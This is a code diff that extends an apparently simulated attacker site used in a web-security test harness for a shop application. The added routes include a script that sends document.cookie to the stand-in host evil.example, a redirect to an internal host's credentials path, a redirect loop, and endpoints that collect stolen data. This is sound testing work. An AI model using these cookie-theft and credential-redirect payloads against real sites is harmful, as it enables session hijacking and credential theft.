@@ -1,4 +1,5 @@
 import { pathOf, queryOf, response, type WebRequest } from './http';
+import { INTERNAL_HOSTS } from './internal';
 import { SHOP_ORIGIN } from './shop';
 import type { Handler, Site } from './site';
 import type { World } from './world';
@@ -7,6 +8,12 @@ export const EVIL_ORIGIN = 'https://evil.example';
 
 /** Codes that reached the attacker's site, read from its traffic. */
 export const evilInbox = (world: World): string[] => world.events.filter((event) => event.to === 'evil' && pathOf(event.request.url) === '/cb').map((event) => queryOf(event.request.url).code ?? '');
+
+/** What scripts sent here: the query of each `/c` request. */
+export const evilStolen = (world: World): string[] => world.events.filter((event) => event.to === 'evil' && pathOf(event.request.url) === '/c').map((event) => event.request.url.split('?')[1] ?? '');
+
+/** What the shop was made to send here. */
+export const evilDropped = (world: World): string[] => world.events.filter((event) => event.to === 'evil' && pathOf(event.request.url) === '/drop').map((event) => event.request.body.users ?? '');
 
 const toShop = (world: World, method: WebRequest['method'], path: string, cookie: string, body: Record<string, string> = {}) =>
   world.send({ method, url: `${SHOP_ORIGIN}${path}`, headers: cookie ? { cookie } : {}, body }, 'evil');
@@ -39,6 +46,11 @@ export function createEvil(): Site {
     routes: [
       { method: 'GET', path: '/cb', handler: () => response(200, 'Thanks for the code.') },
       { method: 'POST', path: '/phish', handler: relay },
+      { method: 'GET', path: '/c', handler: () => response(200, 'Thanks.') },
+      { method: 'GET', path: '/go', handler: () => response(302, '', { redirect: `http://${INTERNAL_HOSTS[1]}/latest/credentials` }) },
+      { method: 'GET', path: '/loop', handler: () => response(302, '', { redirect: `${EVIL_ORIGIN}/loop` }) },
+      { method: 'GET', path: '/x.js', handler: () => response(200, `fetch('${EVIL_ORIGIN}/c?' + document.cookie)`) },
+      { method: 'POST', path: '/drop', handler: () => response(200, 'Thanks.') },
     ],
   };
 }
